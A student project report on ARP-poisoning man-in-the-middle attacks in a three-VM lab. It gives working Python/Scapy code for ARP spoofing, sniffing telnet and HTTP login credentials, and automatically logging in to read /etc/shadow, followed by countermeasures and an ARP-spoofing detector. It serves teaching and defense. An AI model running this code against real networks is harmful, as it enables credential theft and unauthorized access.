# Language-based Security

## Project - Man In The Middle Attack

Fire Group 29: Antoine Perry & Yann-ly Hervé

### Introduction

To complete this language-based security course, we were asked to choose a topic of study, and provide fine analysis about it. We decided
to work a well-known vulnerability: The Man In The Middle (MITM) attack. There are a lot of different ways to accomplish this attack and we will cover one of the most 
famous ones, which is called ARP Poisoning.

The following report will be organised as follows:

- The goal of this project, i.e what is our objective.

- How to perform these kind of attacks, using Python scripting.

- How to prevent these attacks, also using Python scripting.

- Our results and a discussion.

### Goal of the project

The goal of the project is to demonstrate the vulnerability (unsecure communications) of the 
HTTP and telnet protocols and why it is important to use their secure (encrypted) versions SSH and HTTPS. 
To do that, we will first create a Man In The Middle Python script to launch an ARP Poisoning attack against a client and a server VM, leading to an IP spoofing situation. Then, in the case of telnet, we will create a telnet sniffing Python script to analyse the payloads of the telnet connection packets 
sent from the client to the server in order to fetch the unencrypted credentials. The script will then initialise automaticaly a telnet connection to the server with the retrieved credentials and steal the informations countained in the shadow file. In the case of HTTP, we 
will create an HTTP sniffing Python script to analyse the POST HTTP packets, containing unencrypted credentials, sent from the client to a test website (login page) running on the server and print them to the attacker.

It is a project written in Python that demonstrates application layer protocols’ 
vulnerabilities. Also, we will first take the point of view of an attacker by creating and 
executing the scripts and then switch to a defender’s point of view by discussing the possible 
countermeasures as we did in the labs. As a custom countermeasure, we will create another Python script: An ARP Poisoning detector that checks the local ARP table in real-time to see if it has not been tampered (MAC and IP addresses must stay bijectives).

### The Attacks

#### Initial Configuration

In order to demonstrate how an attacker inside a private network could retrieve important 
informations from an unsecure connection between two hosts, we used three virtual machines (VirtualBox) to simulate connections between a client 
and server and an eavesdropping kali machine. We will have a machine running Ubuntu 16.04 as a client, and another machine running Ubuntu 16.04 as a server.

![VirtualBox VMs](assets/virtualbox-vm.png)

Client IP is 192.168.0.42/24.

![Client's network information](assets/client-ip.png)

Server IP is 192.168.0.43/24.

![Server's network information](assets/server-ip.png)

The attacker is also connected to the network, and uses Kali Linux 
to perform the attack. Its IP address is 192.168.0.44/24.

![Attacker's network information](assets/kali-ip.png)

#### Language and libraries

- Python, which is an interpreted, high-level, general-purpose programming language.
 Created by Guido van Rossum and first released in 1991, Python's design philosophy emphasizes code readability with its notable use of
 significant whitespaces. It will suits very well to demonstrate things like this since it allows to perform powerful actions using a few lines of code, which makes our programs more readable, in a short amount of time.

- Scapy : Scapy is a powerful Python-based interactive packet manipulation program and library. It is able to forge or decode packets of a 
wide number of protocols, send them on the network, capture them, 
store or read them using pcap files, match requests and replies and much more. It is designed to allow 
fast packet prototyping by using default values that work. We will use this to efficiently craft malicious packets on our network to demonstrate the vulnerability.


#### Python code files

- main.py: this file is the central hub to launch all the other scripts. You just need to specify an argument when launching this script between the available list (ARP, telnet, http, defense). For the `http` or `telnet` sniffing commands to work, you should launch the `ARP` command first in a separate window in order to become MITM.

- src/mitm/mitm.py: this script is launched with the `ARP` command when executing main.py. The script launches the ARP Poisoning attack on the specified IP addresses (client & server) so that the attacker becomes MITM. When stopped, it sends the correct ARP responses packets back to the targets.

- src/mitm/sniffer_telnet.py: this script is launched with the `telnet` command when executing main.py. The script analyses the content of the telnet connection packets that are transiting between the client and the server to fetch the credentials. Once the credentials are obtained, the script prints the login/password for the attacker and initialises a telnet connection to the server with those credentials. It then tries to read the content of the shadow file and paste its content in a .txt file called `output_date.txt`.

- src/mitm/sniffer_http.py: this script is launched with the `http` command when executing main.py. The script analyses the content of the POST HTTP packets that are transiting between the client and the server when the client tries to log in on the web page. It fetchs the credentials and print them for the attacker.

- src/mitm/anti_spoofing.py: this script is launched with the `defense` command when executing main.py. The script only works on a Windows environment for now but it will continuously check the content of the ARP table and detect if a MAC address corresponds to two different IPs. Once it detects an ARP Poisoning attempt, it will print an alert for the administrator.

- src/mitm/utils.py: Python file not launchable via the main.py. It contains a function used in the majority of our scripts that sends an ARP request to a specified IP in order to get its MAC address.

- src/webapp/: contains our test login page files (index.html, login.php and style.css).

#### How to test our project

The first thing to do in order to test our project is to have 3 VMs installed on the same subnetwork: an attacker, a client and a server. You can dowload our client and server `.ova` files in the Appendix section or used your own VMs.
You have to install telnet client on the client VM and telnet server on the server VM. You also have to install apache2 on the server VM. You can use our test login page files to run on the port 80 of your server VM.
Finally, you have to git clone our project and simply run the script main.py with an argument.
You also need to install the `scapy` library as specified in the `requirements.txt` file.

Do not forget that you need to execute `python3 main.py ARP` in a separate window before using `python3 main.py telnet` or `python3 main.py http`.
Once you executed `python3 main.py telnet`, you can start a telnet connection between you client and server to fetch the credentials.
Same principle for `python3 main.py http`. You can then proceed to log in with any login/password pair that you want on the login page and the credentials will be fetched.

For `anti_spoofing.py`, you need to be on a Windows environment because the regex used are different than on Linux.

#### First case: Telnet connection attack

Our first usecase will be a telnet connection between the client and the server machines. Telnet is not recommended, it's considered as an unsecured 
protocol since it is based on unencrypted communication.
To connect remotely using telnet, just use the command `$telnet <ip>`.
In our case to connect to the remote server, we use `$telnet 192.168.0.43`.

We are then prompted to enter login and password

![Telnet remote access](assets/telnet-connect.png)

##### ARP Poisoning

The goal is now to modify ARP tables of both client and server machines to make them think the MAC address of the attacker
is the address corresponding to:

- The client IP for the server machine.

- The server IP for the client machine.
 
Some useful functions in the program to perform this attack:

```python
def get_mac(IP, interface="eth0"):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
``` 

```python
def poison_arp(target1_mac, target2_mac):
    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac))
    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac))
``` 

```python
def undo_arp():
    print("\n[*] Restoring Targets...")
    target1_mac = get_mac(target1_ip)
    target2_mac = get_mac(target2_ip)
    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)
```

Now can can simply run it, and provide as parameters, the IP addresses of targets:

![Spoofing ARP addresses through Kali](assets/spoofing-python.png)


We can see that both the client and the server have their arp cache changed when our python script is running.

One the client we pretend that 192.168.0.43 has the MAC address 08:00:27:d1:98:f9.

![Spoofed client](assets/arp-client-spoofed.png)

One the server we pretend that 192.168.0.42 has the MAC address 08:00:27:d1:98:f9.

![Spoofed server](assets/arp-server-spoofed.png)

##### Packets Sniffing and Credentials Retrieving

Note that this action can be done using Wireshark, but information retrieving might be more general. thus it could take more time to reassemble the login and password since this software displays a lot of information.

![Wireshark Telnet sniffing](assets/wireshark.png)

However, in our case, we have a script that does the sniffing and the credentials retrieving automaticaly.

First of all, we use the scapy library and its function `sniff` to analyse incoming packets on our network interface:

```python
def run():
    global target2_ip
    interface = "eth0"
    
    try:
        target1_ip = raw_input("[*] Enter Client IP: ")
        target2_ip = raw_input("[*] Enter Server IP: ")
        
    except KeyboardInterrupt:
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        sys.exit(1)
    
    print("Analysing packets...")
    client_mac = get_mac(target1_ip)
    sniff(iface=interface, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
          count=0)
```

Here we specify that we only want to analyse incoming packets with a destination port of 23 and a source MAC address from our client machine.
Then, each new packet object will be executed as an argument of the `get_telnet_credentials` function:

```python
def get_telnet_credentials(pkt):
    global counter
    global user_login
    global user_password

    try:
        pkt.getlayer(Raw).load

    except Exception as e:
        return

    payload = str(pkt.getlayer(Raw).load)
    if payload != "b'\\r\\x00'" and counter == 1:
        user_login.append(payload[2])
        return

    elif payload != "b'\\r\\x00'" and counter == 2:
        user_password.append(payload[2])
        return

    elif payload == "b'\\xff\\xfd\\x01'":
        counter = 1
        return

    elif payload == "b'\\r\\x00'":
        counter = counter + 1
        if counter == 3:
            print("Credentials found in Telnet packets")
            use_telnet_credentials(user_login, user_password)
        else:
            return
    else:
        return
```

Here we check the payload of every packet, to see if it contains a character belonging to the login or password. If a payload contains the string `b'\xff\xfd\x01'`, it means that the following queue of packets will have the characters belonging to the credentials in their payload.
A payload containing the string `b'\r\x00'` indicates the separation between the login and the password, as well as the end of the queue for credentials sending.
When all the characters of the login and password have been gathered, the `use_telnet_credentials` is executed:

```python
def use_telnet_credentials(login, password):
    global target2_ip

    str_login = ""
    str_password = ""

    for i in login:
        str_login = str_login + i
    for j in password:
        str_password = str_password + j

    print("user login: " + str_login + "| user password: " + str_password)

    try:
        print("Connecting to the host " + target2_ip + "...")
        tn = telnetlib.Telnet(target2_ip, 23, 2)
        tn.read_until(b"login: ", 2)
        tn.write(str_login.encode('ascii') + b"\n")
        tn.read_until(b"Password: ", 2)
        tn.write(str_password.encode('ascii') + b"\n")
        tn.write(b"sudo cat /etc/shadow\n")
        # Following line would need to be changed depending of the language configuration of the server machine: actually set for a French VM
        # Could be replaced by b"[sudo] password for " + str_login.encode('ascii') + b": " in English VM
        tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
        tn.write(str_password.encode('ascii') + b"\n")
        tn.write(b"exit\n")
        read_data = tn.read_all()
        with open('output_data.txt', 'w') as output:
            output.write(str(read_data))
        print("[*] Ending Telnet Session: check output_data.txt for shadow file content")
        sys.exit(1)
        
    except Exception as e:
        print("an error occured: " + str(e))
        sys.exit(1)
```

This function print the sniffed login and password and also, using the `telnetlib` libary, allows us to automatically connect to the server and steal the content of the shadow file.

Here we can see the result of executing the telnet sniffing script (after executing the ARP poisoning script).

![Telnet Hacking](assets/telnet-leak.PNG)


#### Second case: HTTP connection attack

To establish this attack, we installed an apache2 web server on the server machine by using the command: `sudo apt install apache2`.
Then, we created the `index.html`, `login.php` and `style.css` (which you can find in our webapp directory) in the directory `/var/www/html/`.
We just need to start the apache2 web server with the command `sudo systemctl start apache2` and the port 80 becomes accessible to the client machine. We don't use an iptable firewall so there is no need to worry about allowing HTTP traffic to reach the port 80.

Here you can see that we used the front page from facebook as a test login page:

![Fake login page](assets/login-page.PNG)

##### ARP Poisoning

We use the same functions, as explained previously, to launch an ARP Poisonning attack on the client and the web server in order to sniff the HTTP traffic.

##### Packets Sniffing and Credentials Retrieving


Here again, it is possible to use Wireshark to analyse the HTTP traffic and get access to the credentials in the POST request:

![Wireshark HTTP sniffing](assets/wireshark-http.png)

In our code, we still use the `sniff` function to analyse incoming packets:

```python
def run():
    interface = "eth0"
    
    try:
        target1_ip = raw_input("[*] Enter Client IP: ")
        target2_ip = raw_input("[*] Enter Server IP: ")

    except KeyboardInterrupt:
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        sys.exit(1)
    
    print("Analysing packets...")
    client_mac = get_mac(target1_ip)
    sniff(iface=interface, prn=get_http_credentials,
          filter='dst port 80 and ether src {} and host {}'.format(client_mac, target2_ip), store=0, count=0)
```

Then every packet object is executed as an argument of the function `get_http_credentials`:

```python
def get_http_credentials(pkt):
    global user_login
    global user_password
    global password_field
    global login_field
    full_str_credentials = ""

    try:
        pkt.getlayer(Raw).load

    except Exception as e:
        return

    payload = str(pkt.getlayer(Raw).load)
    if "POST" in payload and "Upgrade-Insecure-Requests" in payload:
        try:
            for i in range(get_index(payload, login_field), len(payload) - 1):
                full_str_credentials = full_str_credentials + payload[i]

        except Exception as e:
            print("Credentials not found in POST request")
            return
        
        print("Credentials found in POST request")
        for j in range(get_index(full_str_credentials, login_field) + len(login_field),
                       full_str_credentials.index("&")):
            user_login = user_login + full_str_credentials[j]

        for k in range(get_index(full_str_credentials, password_field) + len(password_field),
                       len(full_str_credentials)):
            user_password = user_password + full_str_credentials[k]

        print("user login: " + user_login + " | user password: " + user_password)
        sys.exit(1)

    else:
        return
```

This function allows us to parse the content of the POST HTTP request payload in order to get the login and the password.
The function `get_index` returns the index of a character in a string.

Here we can see the result of executing the http sniffing script (after executing the ARP poisoning script).

![HTTP Hacking](assets/http-leak.PNG)

### Countermeasures

1. Network Configuration
    
    - Use static ARP tables: If you are located in a private network that belongs to you, you can set 
    it up so you cannot modify ARP tables. It will ensure that receiving wrong ARP response packets will not allow an attacker to 
    spoof an IP address to perform such an attack.
	
    - Avoid public networks: These attacks are even easier to do when their is a lot of traffic on the network,
    since it might allow to capture a huge amount of data. The attacker has a higher probability to sniff useful packets that
    could allow him to gain important informations on his targets. 

2. Client & Server Configuration

    - Don't use unencrypted channels to communicate over a network. Using secured protocols like SSH over Telnet
    and HTTPS over HTTP highly reduces the risks of this type of attacks to cause damages.
	
	- Use the "antidote" patch for Linux. This allows the machine to first try to communicate to the old MAC address in his arp table before accepting the newly received one.
	
	- Some Unix systems only accept the first arp response received and drop the future ones until the entry times out. 
    
3. Security Prevention

    - Only trust what you know, and be careful of what you're doing on the internet. A lot of big companies 
    (Facebook, AirBnb, ...) have well programmed and secured app. It is now very difficult to gain illegal access or steal informations using these platform.
     Untrusted platform might be more vulnerable to these type of attacks, since they have a less important budget allocated on security.
	 
    - Since data becomes more and more difficult to steal every day, a lot of attacks are now based on phishing, i.e pretending that you're the provider of a service and gaining information directly from the victim, without any suspicion from him.
    
4. Detection-based program

    - Since this type of attack is quite stealthy, because it doesn't affect our system in a significant way, excepted by changing our ARP cache (which is usually not bind to any form of security),
    we can still create a real-time analysis to detect when the ARP cache becomes suspect. We can then alert the user by logging the intrusion into a file, sending an mail or even canceling the ARP modification. 
    Since Windows is the most used OS from the client side, we decided to make a defense system for this platform in particular, as a proof of concept:
    
```python
import os
import re
import time

from pip._vendor.distlib.compat import raw_input


def check_arp_integrity(list):
    if len(list) == len(set(list)):
        return False
    else:
        return True


def anti_spoofing(iface="192.168.0.37"):
    print("Running anti-spoofing program on interface {}".format(iface))
    while 1:
        try:
            mac_add = []
            with os.popen('arp -a -N {}'.format(iface)) as f:
                data = f.read()

            for line in re.findall('([-.0-9]+)\s+([-0-9a-f]{17})\s+(\w+)', data):
                mac = line[1]
                if mac != "ff-ff-ff-ff-ff-ff":
                    mac_add.append(line[1])
            arp_checking = check_arp_integrity(mac_add)
            if arp_checking:
                print("ALERT !!")
                break
            time.sleep(1.5)

        except KeyboardInterrupt:
            print("Stopping program..")
            break


def run_antispoof():
    ip = raw_input("[*] Enter IP [192.168.0.37]: ")
    if ip == "":
        ip = "192.168.0.37"
    anti_spoofing(ip)
```
Thus, when an attacker tries to harm our ARM system, we immediately receive an alert:

![ARP attack triggered](assets/arp-defense.png)

It is also possible to use an IDS to filter suspect ARP response packets.

### Results and Discussion

Originaly, we had additional functionalities in mind for our attack scripts like sending a crafted RST packet to close the client’s Telnet connection or sending a crafted 404 HTTP error packet after the client’s login.
But with time, we thought that it would make the attack a lot more suspicious on the client's side and finally decided to drop these ideas. We also wanted to create our attacks from scratch (without using premade libraries to help) and fully create/analyse network packets thanks to socket programming. But we rapidly saw that it would just be too long to implement such attacks, on the short duration of the project, without using the help of some well-known packets formatting libraries like Scapy (We are also a bit new in network side programming which didn't help our case).
This is why we decided to use the library Scapy to help us on our project.
However, we also decided to add a custom countermeasure part to our project's goal, with the ARP Poisoning detector script, which was really interesting to make.

From the different tests that we realised, we are satisfied of our scripts which work as attended (as the pictures show).

With this project, we can note that perform a Man In The Middle attack can be very feasible for a determined attacker. Even more with nowdays tools like Ettercap, Driftnet, etc.
Since this attack relies on the fact that you have to be already connected to the target network, it can be extremely difficult to realise in real case scenarios when it comes to 
attacking a remotely located target (if you want to steal important informations transiting on the internet to the servers of a huge company for example).

Also, we noticed during this project that Python is a really powerful tool for developing the sniffer/spoofer, but also for developing the Proof of Concept of our anti-spoofing system.
Even if our program succeeds in detecting intrusions in real-time, work still remains in order to have a totally secure and fault-proof countermeasure. Indeed, for the moment it only detects the attack post-mortem: The program detects the modification but the ARP table remains modified.

Nowadays, security on the internet becomes very important, we saw that even in a small private network, it is still possible to leak important information, with few resources needed.
This can become highly critical when it comes to important infrastructures like hospitals, data center of bank companies, etc. Secured protocols have been created to replace older ones that were thought in terms of simplicity/accessibility instead of security. They can counter these attacks, but users can still 
be tricked by other attacks like social engineering, phishing attacks, etc. And if attackers are determined and have enough resources, they can also bruteforce leaked data to extract informations. 

### Sources

1. [How To Do Man In The Middle Attack(MITM) with ARP Spoofing Using Python and Scapy](https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b)
2. [How to Prevent ARP Spoofing Attacks?](https://www.indusface.com/blog/protect-arp-poisoning/#Identify_the_Spoofing_Attack)
2. [Scapy Documentation](https://scapy.readthedocs.io/en/latest/)
2. [ARP poisoning/spoofing: How to detect & prevent it](https://www.comparitech.com/blog/vpn-privacy/arp-poisoning-spoofing-detect-prevent/)

### Appendix

Contributions:
- Antoine Perry: Worked specificaly on the mitm and anti_spoofing scripts
- Yann-ly Hervé: Worked specificaly on the sniffer_telnet and sniffer_http scripts

We worked together on the report and the setup of the environment to do our tests.
Globally, the quantity of work was shared equally between the two students.

1. [Client Virtual Machine [ login:client | password:client ]](https://drive.google.com/open?id=1jqys0pS7WHDOQ2o-dHbC_ZloOjKGRBb-)
2. [Server Virtual Machine [ login:server | password : server ]](https://drive.google.com/open?id=1yCcbmsN0bCVQOsF0VYAkSZGiv8p4rXXd)

